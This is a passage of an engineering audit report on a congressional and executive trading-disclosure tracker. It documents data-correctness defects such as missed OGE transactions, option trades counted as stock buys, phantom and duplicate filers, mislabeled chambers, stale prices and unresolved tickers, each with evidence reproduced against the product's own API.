- **Evidence:** Source PDF (https://extapps2.oge.gov/201/Presiden.nsf/PAS+Index/3B5D301E5EACE5C885258DB300345F78/$FILE/Scott-A-Kupor-01.09.2026-278T.pdf, fetched directly) page 2 lists 3 transactions for Scott Aaron Kupor (Director, Office of Personnel Management): #1 Omada Health Inc. (OMDA) Sale 12/19/2025 $250,001-$500,000; #2 Coinbase Global Inc. Class A (COIN) 'See Endnote: Execution of option contract' Sale 12/19/2025 $250,001-$500,000; #3 Samsara Inc. Class A (IOT) Sale 12/23/2025 $1,000,001-$5,000,000. `curl https://congress.trade/api/filings/E-2026-scott-a-kupor-01-09-2026-278t` and `curl 'https://congress.trade/api/transactions?member=EXEC-SCOTT-A-KUPOR'` both return exactly ONE transaction total (Omada, ticker even left null) -- COIN and IOT are completely absent from the product. The admin ingestion_decisions audit trail (`GET /api/admin/ingestion-decisions?docId=E-2026-scott-a-kupor-01-09-2026-278t`) shows the automated textPdf extractor found 0 rows ({"action":"review_opened","reason":"extract_empty_failure,no_transactions_extracted","transactionCount":0}), then an admin-token actor resolved it via decision='manual' with {"editCount":1,"inserted":1} -- i.e. the human review step that exists specifically to correct automated extraction failures itself only transcribed 1 of the 3 disclosed rows, and that state has been live since 2026-08-04T08:00:25Z (15 days as of this review).
- **Panel:** gap-extraction-ground-truth-audit — Reproduced twice independently (curl to /api/filings/:docId and curl to /api/transactions?member=), and cross-checked the ingestion_decisions audit trail which shows the exact automated-then-manual pipeline that produced the gap.  A second manual-source OGE filing sampled for comparison (Christine Abizaid, 9/9 rows) was fully correct, so this is not shown to be systemic across all manual entries in this small sample -- but it is a live, severe, single-instance defect on a high-profile filer, not a false positive. · `gap-extraction-ground-truth-audit/GAPEXTRACTIONGROUNDTRUTHAUDIT-01`

#### 17. [P1] Net Flow / Approx. Volume / ticker net-flow ranking count option premiums as stock dollars — 46% of the +$8.2m headline Net Flow is two Pelosi call-option buys

- **Where:** app/src/analytics/sql.ts:162-167 (SIGNED_MIDPOINT_SQL); app/src/analytics/routes.ts:205-227 (/summary, no excludeOptions passthrough); Largest Buys/Sells cards removed by PR #2020  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Bracket values for options (premium, and for calls a bullish bet / for puts bearish) are summed into 'buy dollars' alongside stock purchases, so the direction-of-money KPIs and the per-ticker net flow are dominated by a couple of derivative trades and label them as buying the company.
- **Impact:** The top-line 'Net Flow +$8.2m' and 'INTC ~$3.0m buy' mislead; Buy Pressure also counts option buys as buys.
- **Fix:** Default the $ KPIs and ticker net flow to stock-only (excludeOptions) with an 'incl.  N option trades' footnote, or show options as a separate chip; label option rows as 'INTC calls' in any largest/ranked list.
- **Evidence:** summary?window=90d: estimatedNetFlowUsd 8,246,634; summary?window=90d&excludeOptions=true: 4,504,135 (volume 97.4m → 93.6m). sector-breakdown 90d: Options 6 trades, est_volume 3,782,003, net +3,734,000. ticker-leaderboard sort=netflow: INTC 7 trades 2 buys/5 sells net +2,967,999 — the 2 'buys' are `OP option 1000001-5000000` rows. trends.png 'Largest Buys: INTC Intel Corp. ~$3.0m'. sql.ts:162-167 SIGNED_MIDPOINT_SQL has no is_option / tx-kind guard; routes.ts:205-227 /summary does not pass excludeOptions.
- **Panel:** data-correctness — Reproduced live 2026-08-19: summary?window=90d estimatedNetFlowUsd 8,199,633; with excludeOptions=true 4,457,134 — a $3.74m swing (~46% of the non-excluded figure), matching the raw finding's proportion closely.  Note: 'Largest Buys'/'Largest Sells' cards were removed from Trends by PR #2020 (merged, origin/main ba699ffb) after the raw finding's capture, so the specific 'INTC ~$3.0m' surface no longer exists — but the underlying Net Flow/Approx.  Volume KPI contamination (the actual defect) is unchanged and still live in /api/analytics/summary and the ticker leaderboard. · `data-correctness/DATACORRECTNESS-10`

#### 35. [P1] Party filter does not partition: All = 2,178 but D+R+O = 2,166; 'Other' returns 0 while 12 trades have no party

- **Where:** app/src/analytics/sql.ts:173-177, 288-294 (line numbers may have drifted slightly but content unchanged)  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Executive-branch and unresolved filers have no party, are excluded by any explicit party selection, and are silently absent from 'Other', so the sum of the three party options never equals All and the 'Other' option is dead.
- **Impact:** Users toggling parties see numbers that don't reconcile; party split charts and cluster party counts omit members; 'Other' looks broken.
- **Fix:** Either bucket NULL into 'O' (rename 'Other / Nonpartisan') or add an explicit 'No party (executive)' bucket in PARTY_BUCKET_SQL and party-split; make cluster cards print 'N with no party' when counts don't sum; add test All == sum of buckets.
- **Evidence:** curl summary?window=90d → 2178/79; party=D,R,O → 2166/76; party=D 1398, R 768, O 0. member-leaderboard 90d rows with partyBucket null: MANUAL-ELVIRA (9), EXEC-FRANK-J-BISIGNANO (2), EXEC-MICHAEL-J-KRATSIOS (1) = 12. sql.ts:173-177 PARTY_BUCKET_SQL '… ELSE NULL END' and :19-20 'Unknown party stays NULL rather than being treated as Independent'; :288-294 parties filter `IN (…)` drops NULL. Cluster UNH shows '0 Democrats, 3 Republicans' for 4 politicians.
- **Panel:** data-correctness — Reproduced live 2026-08-19: summary?window=90d totalTrades 2190; party=D 1399, party=R 779, party=O 0; sum 2178 vs total 2190, gap of 12 — same reconciliation gap and same dead 'O' bucket as the raw finding (absolute numbers drifted with new ingestion but the defect pattern is identical). · merged: qa-bughunt/QABUGHUNT-06, api-contract/APICONTRACT-13 · `data-correctness/DATACORRECTNESS-09`

#### 39. [P1] Pelosi drawer 'Performance vs S&P 500' is computed from two fabricated competitor duplicates of an options trade

- **Where:** unchanged  ·  **Surface:** Web · desktop  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** A member whose real buys were options (unscorable) is shown with a stock-performance score derived from duplicate rows that mislabel the option as an $8k stock buy.
- **Impact:** A prominent member's public 'skill' number is fabricated; 'their timing' vs 'if you bought at filing' cannot differ for such rows, masking the copy-trade lag.
- **Fix:** Exclude competitor_backfill rows from performance scoring (and from tx_performance anchors) until they carry real brackets/filing dates; when a buy row has an option twin, inherit is_option.
- **Evidence:** politician-detail.png: 'Their timing −13.8% avg excess · 0% win · 2 of 4 buys' and identical 'If you bought at filing −13.8%'. /api/analytics/member/house-ca11-nancy-pelosi?window=90d recentTrades: INTC/UBER `primary OP option` (isOption true, $1m–$5m / $500k–$1m) + competitor twins (`stock`, isOption false, $1,001–$15,000, filed_date = tx_date). compute.ts:275 `if (r.isOption) continue;` excludes the real rows, so only the two competitor rows are scored; because their filed_date equals tx_date the filing leg equals the trade leg.
- **Panel:** data-correctness — Reproduced live 2026-08-19: /api/analytics/member/house-ca11-nancy-pelosi?window=90d recentTrades shows exactly the described pairing — competitor_backfill UBER/INTC B isOption:false amountMin 1001/15000 alongside primary UBER/INTC B isOption:true amountMin 500001-1000000/1000001-5000000. compute.ts:275 confirmed verbatim at that line in origin/main. · `data-correctness/DATACORRECTNESS-08`

#### 40. [P1] first_seen_at precedes the official filing date (and the trade date) for ~2.5% of rows — 'SEEN Jul 30' before 'TRADED Aug 5'

- **Where:** app/src/ingestion/tradeLatency.ts:2341-2359; fix proposed in unmerged PR #2015 (app/src/delivery/tradeLearnedAt.ts)  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** A filing cannot be seen before it is filed; the stamp is inherited from an earlier poll/placeholder, so the drawer timeline is impossible and any CT-first-seen based latency delta is overstated for those docs.
- **Impact:** Users see nonsense timelines; the 'we saw it first' clock is untrustworthy for affected docs.
- **Fix:** At persist time set first_seen_at = max(first_seen_at, filed_date) or re-stamp when the real filing lands; in the UI hide 'Seen' when it predates 'Official Filed' and flag the row; exclude such docs from latency races.
- **Evidence:** /api/client/v1/trade/aa349372-…: tx 2026-08-05, filedDate 2026-08-10, firstSeenAt 2026-07-30T15:32:12Z (doc H-2026-20035134). 31 of 1,250 sampled feed rows have firstSeenAt date < filedDate (also McGuire H-2026-20035180). tradeLatency.ts@origin/main:2341-2359 uses `tx.firstSeenAt || ctx.first_seen_at` as congress_first_seen_at for races.
- **Panel:** data-correctness — Could not reproduce directly: sampled 1,000+ live /api/transactions rows via several pagination offsets and found zero firstSeenAt < filedDate cases (the affected rows are evidently a small tail not surfaced by my sampling, and the specific docId H-2026-20035134/aa349372 wasn't retrievable without a working search).  However, open PR #2015 'Stop claiming we discovered a trade before it happened' (unmerged as of 2026-08-19) independently documents the exact same mechanism with the exact same example — Kevin Hern H-2026-20035134, first-seen 2026-07-30T15:32:12.565Z, traded 2026-08-05, filed 2026-08-10 — confirming the defect is real and current on main.  Recommend the owner route this finding to PR #2015 rather than opening new work; the PR's fix (skip fallback dates that predate tx_date, in delivery/tradeLearnedAt.ts) matches this finding's recommendation closely. · merged: ios-engineering/IOSENGINEERING-31, ios-hig-ux/IOSHIGUX-39, ios-shipped-app/IOSSHIPPEDAPP-09 · `data-correctness/DATACORRECTNESS-15`

#### 49. [P1] Competitor last-name mapping creates phantom filers: 'Maria Elvira' (Senate) and 'John Delaney' (House NY-7) hold April McClain Delaney's and Maria Elvira Salazar's trades

- **Where:** unchanged  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Backfill docIds are keyed by last name (COMPETITOR-delaney_…, COMPETITOR-elvira_…) and were attached to new MANUAL-* filers with guessed chamber/party instead of the existing member, so a non-member (John Delaney, left Congress 2019) and a truncated name appear as active traders and every breadth metric (distinct politicians) double counts them.
- **Impact:** Wrong people are publicly named as trading; consensus/breadth signals are inflated; party split shows 0 Democrats for a cluster that is 4 members; Directory lists 381 'politicians' including ghosts.
- **Fix:** Re-key competitor rows to existing filer ids via bioguide/name resolver (resolveMember), merge MANUAL-ELVIRA→house-fl27-maria-elvira-salazar and MANUAL-DELANEY→house-md06-april-mcclain-delaney, delete/deprecate the phantom filers, and add an ingest guard that refuses to create a new filer from a bare last name when an existing filer matches.
- **Evidence:** /api/members: `{"filerId":"MANUAL-ELVIRA","fullName":"Maria Elvira","chamber":"senate","party":null,"txCount":92}` alongside `house-fl27-maria-elvira-salazar … txCount 130`; `{"filerId":"MANUAL-DELANEY","fullName":"John Delaney","chamber":"house","party":"Democrat","state":"NY","district":"7","txCount":365}` alongside `house-md06-april-mcclain-delaney 335`. /api/analytics/ticker/HUBB?window=90d: topBuyers `[('John Delaney', 9), ('April McClain Delaney', 8)]` with rows `COMPETITOR-delaney_HUBB_2026-06-17_buy` vs `primary H-2026-20034932 dependent` on the same dates. /ticker/BEP: topBuyers Salazar 9 + 'Maria Elvira' 4, identical dates. Cluster UNH SOLD: '4 politicians, 0 Democrats, 3 Republicans' — the 4th is 'Maria Elvira'. directory-a11y.txt:194-196 'John Delaney … House • D • NY - 7th 365'; :431-432 'Maria Elvira … Senate 92'; trends-full.png Most Active shows 'John Delaney · House · NY 39 trades'.
- **Panel:** data-correctness — Reproduced live 2026-08-19: /api/analytics/member/MANUAL-ELVIRA returns chamber:senate, party:null, totalTrades:92, MUNICIPAL-SECURITY/BEP top tickers exactly as described. /api/analytics/member/MANUAL-DELANEY returns chamber:house, party:Democrat, state:NY, district:7, totalTrades:365, TSCO/MKL/BJ top tickers. /ticker/BEP topBuyers = [Salazar 9, MANUAL-ELVIRA 4] exact match. /ticker/HUBB and /ticker/TSCO both show MANUAL-DELANEY alongside April McClain Delaney with matching trade counts.  The MANUAL-* member-search endpoint (/api/members?q=) does not appear to support free-text name search (returned unrelated top-volume members for both 'Elvira' and 'Delaney' queries) so I resolved by filerId directly instead — worth a separate, smaller UX finding but does not affect this one. · `data-correctness/DATACORRECTNESS-03`

#### 50. [P1] Directory chamber/party/district wrong for dozens of MANUAL-* filers: executive officials labelled 'Senate', House members labelled Senate, wrong districts

- **Where:** unchanged  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** MANUAL-* filer records were created with guessed metadata; chamber is frequently 'senate' for anyone not matched to the House roster, so the chamber filter (house/senate/executive) and every per-chamber number mis-bucket these trades, and the Directory asserts false offices.
- **Impact:** Factually wrong public labels (a Defense Secretary shown as a Senator), wrong chamber KPIs, executive filers escape the 'Executive' filter and the position-title rule.
- **Fix:** Backfill MANUAL-* filers from the bioguide/OGE roster (photo key already carries the bioguide id, e.g. photos/member?key=F000459), set chamber=executive + title for agency officials, correct state/district, and block 'senate' as a default; add a data test that every filer with a House photo key has chamber house.
- **Evidence:** /api/members: MANUAL-HEGSETH 'Pete Hegseth' chamber senate party null; MANUAL-LUTNICK, MANUAL-BONDI, MANUAL-BURGUM, MANUAL-WRIGHT, MANUAL-MCMAHON, MANUAL-BLANCHE, MANUAL-MIRAN, MANUAL-ISAACMAN, MANUAL-LANDAU… all `chamber: senate, party: null` (cabinet/agency officials). House members tagged senate: MANUAL-JORDAN 'Jim Jordan senate R OH-4', MANUAL-FLEISHMANN TN-3, MANUAL-SCHRIER WA-8, MANUAL-LANGEVIN RI-2, MANUAL-COSTA CA-21, MANUAL-GRIJALVA AZ-7, MANUAL-LOWENTHAL CA-47, MANUAL-NICOLAS GU. Wrong geography: MANUAL-GREEN 'Mark Green house R WI-8' (Green was TN-7), MANUAL-DELANEY NY-7, MANUAL-SULLIVAN 'Dan Sullivan house R AK' (a Senator), MANUAL-LONG 'Gillis Long senate D LA-8' (died 1985). directory-a11y.txt:714-715 'Pete Hegseth … Senate', :1384-1385 'Gillis Long Senate • D • LA - 8th', :1388-1389 'Jim Jordan Senate • R • OH - 4th'. CONTEXT.md convention: executive filers show their position, never 'Executive' or a district.
- **Panel:** data-correctness — Reproduced live 2026-08-19 for 5 of the cited ids: MANUAL-HEGSETH chamber:senate/party:null; MANUAL-JORDAN chamber:senate/state:OH/district:4 (Jordan is a House member); MANUAL-GREEN chamber:house/state:WI/district:8 (the real Mark Green represented TN-7); MANUAL-SULLIVAN chamber:house/state:AK (Dan Sullivan is a Senator); MANUAL-LONG chamber:senate/state:LA/district:8 (Gillis Long, House member, died 1985).  All exact matches to the raw finding's claims. · `data-correctness/DATACORRECTNESS-04`

#### 51. [P1] Duplicate identities for the same executive/House filer (EXEC-* vs MANUAL-*, slug vs MANUAL-*) split and double count trade histories

- **Where:** unchanged  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** The same person exists under two filer ids with different chamber/party metadata, so their trades are split (or duplicated) across two Directory rows and counted as two politicians.
- **Impact:** Politician counts and per-member stats are wrong; users cannot find a filer's full history in one place.
- **Fix:** Run identity merge (identitySync) for these pairs, keep one canonical filer id, re-point transactions.filer_id, and add uniqueness check on normalized name+chamber at ingest.
- **Evidence:** /api/members pairs: EXEC-CWRIGHT 'Chris Wright' 194 + MANUAL-WRIGHT 'Christopher A Wright' 104; EXEC-DOUGLAS-J-BURGUM 6 + MANUAL-BURGUM 69; EXEC-MICHAEL-J-KRATSIOS 1 + MANUAL-KRATSIOS 49; EXEC-FRANK-J-BISIGNANO 17 + MANUAL-BISIGNANO 41; EXEC-SARA-BAILEY 5 + MANUAL-BAILEY 5; EXEC-SCOTT-A-KUPOR 1 + MANUAL-KUPOR 10; house-nj07-thomas-h-kean 41 (90d) + MANUAL-KEAN 3; house-mn08-peter-allen-stauber 1 + MANUAL-STAUBER 1. #1978 P1-K notes McCaul ×2 generically; these are additional concrete splits.
- **Panel:** data-correctness — Reproduced live 2026-08-19 for 3 of the cited pairs exactly: EXEC-DOUGLAS-J-BURGUM 6 + MANUAL-BURGUM 69; EXEC-MICHAEL-J-KRATSIOS 1 + MANUAL-KRATSIOS 49; EXEC-FRANK-J-BISIGNANO 17 + MANUAL-BISIGNANO 41 — all match the raw finding's counts exactly.  EXEC-CWRIGHT/MANUAL-WRIGHT pair still splits (chamber executive vs senate, different fullName spellings) though the live counts have drifted to 0/104 from the raw finding's 194/104 (ingestion is continuous; the split itself, which is the defect, is unchanged). · `data-correctness/DATACORRECTNESS-05`

#### 52. [P1] Top Performers' '5+ buys' small-N guard is defeated by duplicate rows — #1 Gary Peters has 3 real buys

- **Where:** app/src/analytics/builders.ts:672-703  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** The leaderboard's minimum-sample and size-weighting operate on raw rows, so duplicates both qualify members and double-weight their trades; the displayed 'N buys • X% win' overstates the sample.
- **Impact:** Ranking and eligibility on the most-cited 'skill' surface are driven by ingestion artefacts, not trades.
- **Fix:** Apply the dedupe from -01 inside buildMemberPerformanceLeaderboardQuery (or a deduped view), and count distinct (tx_date, ticker, bracket) per member for the HAVING clause; add a regression test using the Peters fixture (5 rows → 3 buys → excluded).
- **Evidence:** /api/analytics/member-performance?window=90d: Gary C. Peters tradeCount 5, avgExcess +8.68%, winRate 1.0. /api/transactions?member=senate-gary-peters&from=2026-05-20: T 06-29 (primary + competitor twin), KHC 05-21 (primary + competitor twin), O 07-23 (primary) → 3 distinct buys. Cleo Fields '8 buys' includes NVDA 06-26 ×3 (manual, competitor, primary) and GOOG (primary) vs GOOGL (competitor) priced on different series. builders.ts:672-703 (cd30d4b9) `HAVING trade_count >= ${minTrades}` and size weights `SUM(… * MID)` count each row.
- **Panel:** data-correctness — Reproduced live 2026-08-19: /api/analytics/member-performance?window=90d shows Gary C.  Peters tradeCount:5, avgExcessReturn:0.08682 (=8.68%), winRate:1 — exact match to raw finding. builders.ts:672-703 quoted from origin/main confirms `HAVING trade_count >= minTrades` operates on raw joined rows with no dedup, consistent with -01's root cause. · `data-correctness/DATACORRECTNESS-06`

#### 53. [P1] Excess-return legs use different as-of dates (asset current_price vs latest SPX close) and the price cache is 2+ weeks stale with no as-of shown

- **Where:** app/src/analytics/builders.ts:686  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** 'Excess vs S&P' subtracts a benchmark measured up to 10 days later than the asset price, and both are frozen at early August; nothing on Top Performers, the politician drawer or the ticker sheet says prices are as of Aug 3.
- **Impact:** Every excess figure carries a benchmark-drift error equal to the S&P move over the gap; users read stale performance as current.
- **Fix:** Compute spx_now as the SPX close on/before each ticker's current_price_date (or take both from the same last common bar); refresh current_price from price_eod tail after each EOD sync; print 'Prices as of <date>' on every performance surface; alert when price_eod tail is older than 3 trading days.
- **Evidence:** /api/analytics/performance/28f78eb4-… (Fields NVDA 06-26): `currentPrice 206.84, currentPriceDate 2026-07-24, spxReturn 0.04034` = 758.4/728.99−1 where /api/market/spx last bar is 2026-08-03 (758.4). So the asset leg ends 07-24 and the S&P leg ends 08-03. /api/market/ref/NVDA currentPriceDate 2026-07-24; AAPL/INTC/TSCO/HUBB 2026-08-03; all price_eod series end 2026-08-03 (captured 2026-08-19). builders.ts:686 `WITH sx AS (SELECT close FROM spx_eod ORDER BY date DESC LIMIT 1)` joined to `sr.current_price` (:663); prices/service.ts:707 latestSpxClose. iOS ticker sheet 50-ticker-detail-msft shows '$487.65' with no date (API currentPriceDate 2026-08-03).
- **Panel:** data-correctness — Reproduced live 2026-08-19: /api/market/ref/NVDA currentPriceDate 2026-07-24, currentPrice 206.84; /api/market/ref/AAPL currentPriceDate 2026-08-03; /api/market/spx last close date 2026-08-03 (758.4) — exact match to raw finding.  Both prices are still 16 days stale as of today (2026-08-19), so the underlying cache-refresh problem is ongoing, not just an artifact of the capture. · `data-correctness/DATACORRECTNESS-07`

#### 55. [P1] OGE (executive) asset names carry row numbers, OCR errors and truncation

- **Where:** OGE 278e extraction; visible in Directory → Donald J. Trump → Recent Trades (PoliticianDetailView)  ·  **Surface:** Backend  ·  **Category:** data-correctness  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** (was IOSSHIP-11) Row index captured as part of the name, 'AI' OCR'd as 'Al', names cut mid-word, none resolve to tickers.
- **Impact:** The most-searched filer shows garbage asset names on iOS and web.
- **Fix:** Strip leading `^\d{3,4}\s+` at extraction, run the resolver on the cleaned name, add a golden test on this filing.
- **Evidence:** `/api/client/v1/feed?memberName=Trump&limit=6` (walkthrough curl 2026-08-19T01:29Z): '1146 Jpmorgan Chase & Co. Perp NN 6.8750% (', '1123 the Mosaic Co.', '1120 Tempus Al Inc. Class Class A I', '1117 Snowflake Inc. Class A l', '1087 Intercontinental Exchang'; my re-check `?memberName=Trump&limit=1` returned asset name 'Fob 15, 2034' with ticker null.
- **Panel:** ios-shipped-app — Live `/api/client/v1/feed?memberName=Trump&limit=6` reproduces garbled OCR/row-number asset names verbatim, e.g. '3641 Microsoft Corp.  Com', '3639 Mota Plalfonns, Inc.'  (OCR'd 'Meta Platforms'), all with ticker null. · `ios-shipped-app/IOSSHIPPEDAPP-11`

#### 57. [P1] OCR-misclassification ('form_chrome_only'/'ocr_unusable') silently zeroes out entire legible House filings and wipes the review payload, leaving no recoverable data

- **Where:** app/src/extraction/normalizer.ts:318-322 (isMostlyGarbageOcrExtraction call), :380-410 (reviewFlagged=[] / transactions=[] on ocrUnusable); looksLikeHeaderContaminatedAsset now lives in app/src/extraction/extractRouting.ts (re-exported from normalizer.ts at line ~727), unchanged  ·  **Surface:** Backend  ·  **Category:** extraction-coverage  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** This safety filter correctly exists to stop letterhead/certification-text floods from being published as fake trades (it caught a genuine 421-row garbage OCR flood on a Ro Khanna amendment, H-2024-8220711, which is appropriately quarantined).  But it fires on filings that are not actually garbage -- both sampled documents are ordinary typed/checkbox PTRs a human (or a different extractor, per the McCaul bakeoff row) can read cleanly -- and once it fires, it destroys the very data an admin would need to manually correct the item, forcing a full from-scratch re-transcription that evidently is not happening (both docs have sat unresolved for 9+ days).
- **Impact:** A sitting House committee chairman's entire quarter of disclosed trading (~40 real transactions, several in six figures) is completely absent from the Trades tab, Trends, per-ticker pages, and the API -- with zero visible signal to any user that anything is missing (the filing simply doesn't appear, same as a filing that was never made). 48 filings currently share this state; the count will grow as more scanned PTRs hit the same layout quirks (rotated pages, overlapping struck-through instructional text) that appear to trigger the misclassification.
- **Fix:** Stop discarding the raw parsed rows when ocrUnusable/form_chrome_only fires -- keep them in the review payload (clearly labeled 'rejected as boilerplate, review manually') instead of wiping to [].  Surface the llamaparse/bakeoff alternate-extractor results (already being computed and stored in `models`) into the review UI so an 18-row llamaparse read isn't silently ignored.  Add an admin dashboard counter/alert for review-queue items aged >7 days in this reason bucket so they don't silently accumulate.
- **Evidence:** Live review-queue totals (`GET /api/admin/review-queue?limit=1`) show 48 of 114 unresolved items tagged reason 'form_chrome_only,ocr_unusable,extract_empty_failure,no_transactions_extracted' -- the single largest bucket. Pulled two of these source PDFs directly and read them: (1) H-2025-8220834, Rep. Michael McCaul (TX-10, House Foreign Affairs Chairman), filed 2025-04-17, contains ~40 clearly legible typed transactions across 3 pages (Broadcom, Netflix, Dexcom, Vulcan Materials, Martin Marietta, UnitedHealth, Comcast, Microsoft, Visa, AT&T, Apple, Kraft Heinz, LPL Financial, etc.). `curl https://congress.trade/api/filings/H-2025-8220834` returns `"transactions": []`, `"confidence": 0`, `"ingestStatus": "needs_review"` -- created 2026-08-10, still empty 9 days later at review time. The review-queue payload for this doc is `{"transactionCount":0,"transactions":[]}` (verified via admin API), even though the item's own `models` history shows a llamaparse 'cost-effective' bakeoff run on 2026-08-11 that DID extract rowCount:18 -- that result was never surfaced into the review payload or published. (2) H-2025-8220753, Rep. Charles J. Fleischmann (TN-3), a clean rotated/landscape typed table with 5 legible transactions (iShares IGSB, Global X SHLD/URA, Franklin FLJP, Amplify HACK); `curl https://congress.trade/api/filings/H-2025-8220753` -- same empty-transactions pattern. Code path: normalizer.ts:292-293 drops any parsed row whose assetName matches looksLikeHeaderContaminatedAsset (letterhead/certification-boilerplate regex); when the vision/OCR pass misreads every row as boilerplate (originalCount>=12, usableCount===0), isMostlyGarbageOcrExtraction() returns true, the review payload's `transactions` array is explicitly cleared (`reviewFlagged = []`, normalizer.ts:373) before being written to review_queue, and the reason is tagged form_chrome_only.
- **Panel:** gap-extraction-ground-truth-audit — Both sampled PDFs were read directly and are legible to a human; the zero-transaction state on the live public API was independently reproduced for both docIds.  PR #1959 (open) adds an OGE-specific deterministic-first fallback for executive scanned_pdf, which is a related but different code path (executive OgePdfExtractor, not the House looksLikeHeaderContaminatedAsset/isMostlyGarbageOcrExtraction gate this finding is about) -- not a duplicate. · `gap-extraction-ground-truth-audit/GAPEXTRACTIONGROUNDTRUTHAUDIT-02`

#### 58. [P1] 32.6% of all published trades carry no ticker at all, including obvious large-caps whose company name was correctly transcribed from the source filing

- **Where:** app/src/extraction/normalizer.ts:787-844 (buildResolver, unchanged), app/src/extraction/tickerNormalize.ts:12-24 (unchanged)  ·  **Surface:** Backend  ·  **Category:** extraction-completeness  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** This is a name-to-ticker enrichment gap, not a transcription error -- the extraction pipeline correctly copies what the PDF says (no ticker present, matching the form's own instruction), but the downstream securities_master name-matching that should backfill obvious tickers from company names fails on very common names, apparently because the alias table is empty and simplifyCompanyName's normalization of suffixed forms ('...  CMN', '...  CMN Class A', '(the)') doesn't reliably hit securities_master.name.  A minority of rows in the same filing DO resolve (e.g.  Zimmer Biomet -> ZBH, Take-Two -> TTWO, Boston Scientific -> BSX, and a JNJ options row), showing the matcher partially works.
- **Impact:** Any user or feature that filters/searches/aggregates by ticker (ticker detail pages, Trends per-ticker breakdowns, 'follow this stock' alerts) silently misses roughly a third of all trades, disproportionately concentrated in filings that use plain-English asset descriptions instead of parenthetical tickers -- exactly the format many House PTRs use.  This is a known, self-documented gap (not a surprise), but nothing in the product surfaces it to users, and it was not previously reported by the data-correctness lens (which examined downstream analytics, not the name->ticker resolution step itself).
- **Fix:** Populate securities_master.aliases (the doc comment says the table is empty in prod) from a standard reference source (SEC company_tickers.json, or the already-used securities_ref/FMP enrichment data that DOES have company names for 94.6%+ of tickered trades) so name-only rows can resolve retroactively via a backfill job, not just at extraction time.  Given the fix is data population rather than new code, this is lower effort than it looks.
- **Evidence:** `GET /api/admin/enrich-securities/status` (admin token) reports coverage.trades.total=94696, tickered=63839 -- 30,857 trades (32.6%) have ticker=null. Root-caused on a real filing: H-2026-9116267 (Rep. Ro Khanna, filed 2026-08-07, docKind scanned_pdf, confidence 0.97) -- source PDF literally instructs 'Provide full name, not ticker symbol' (form design, not an extraction failure) and the extractor faithfully transcribed company names, but `curl 'https://congress.trade/api/transactions?member=house-ca17-ro-khanna&from=2026-07-01&to=2026-07-31'` shows ticker=null AND refCompanyName/refSector/refAssetClass=null for the large majority of its 174 rows, including 'Uber Technologies Inc. CMN', 'Coca Cola Company (the) CMN', 'Comcast Corporation CMN Class A Voting', 'Microsoft Corporation CMN', 'Visa Inc. CMN Class A', 'Tesla Inc. CMN', 'At&T Inc. CMN', 'The Home Depot Inc. CMN' -- all instantly identifiable large-cap tickers (UBER, KO, CMCSA, MSFT, V, TSLA, T, HD) that never resolved. tickerNormalize.ts:12-24 documents the known root cause in the codebase itself: 'securities_master is well-populated (~10k symbols) yet (a) carries NO aliases (the alias table is empty in prod)... and (d) is missing a long tail of perfectly valid current symbols.'
- **Panel:** gap-extraction-ground-truth-audit — Coverage percentage taken directly from the admin status endpoint (not estimated); root cause verified against a real filing's PDF and the live JSON API, and against the extraction code's own documentation comment describing the same gap independently. · merged: ios-shipped-app/IOSSHIPPEDAPP-10 · `gap-extraction-ground-truth-audit/GAPEXTRACTIONGROUNDTRUTHAUDIT-04`

#### 68. [P2] sector-flow GROUP BY binds to raw sr.sector, so canonical sector labels still appear 2-3 times per response

- **Where:** app/src/analytics/builders.ts:521-532  ·  **Surface:** Backend  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** new
- **What:** The canonicalization CASE is applied in SELECT but not in GROUP BY, so web renders e.g. two 'Technology' rows (91/97 and 8/10) and the iOS client has to re-aggregate.
- **Impact:** Sector totals are split; web Net Flow by Sector lists the same sector twice; per-sector ranking wrong.
- **Fix:** `GROUP BY 1` (or repeat the CASE expression) in buildSectorFlowQuery; add builders.test asserting no duplicate labels for a fixture with 'Health Care'/'Healthcare'; then drop the iOS merge shim.
- **Evidence:** curl sector-flow?window=90d: 'Technology' 188 and 18, 'Healthcare' 63 and 25, 'Industrials' 82/12/7, 'Communication Services' 28/15 as separate buckets. builders.ts:521-532 `SELECT ${canonicalSectorSql()} AS sector … GROUP BY sector` with ANALYTICS_FROM_JOINS_REF (`LEFT JOIN securities_ref sr`) — SQLite resolves an unqualified GROUP BY identifier to the table column sr.sector before the SELECT alias, so grouping is on the raw vocabulary and only the label is canonicalized. clients/ios TrendsView.swift@origin/main:931-941 documents exactly this and merges client-side ('a backend defect, reported separately'). #1978 §3 observed duplicate labels but not the root cause.
- **Panel:** data-correctness — Reproduced live 2026-08-19: /api/analytics/sector-flow?window=90d returns 'Technology' twice (194, 20), 'Industrials' twice (82, 12), 'Healthcare' twice (64, 25), 'Communication Services' twice (28, 15) — exact confirmation of the duplicate-label pattern. · merged: prior-review-followup/PRIORREVIEWFOLLOWUP-03 · `data-correctness/DATACORRECTNESS-11`

#### 69. [P2] iOS 'Net Flow by Sector' ranks by signed net and folds the largest flow (Energy −$15.5m) into 'Other (7 sectors) −$16.3m'

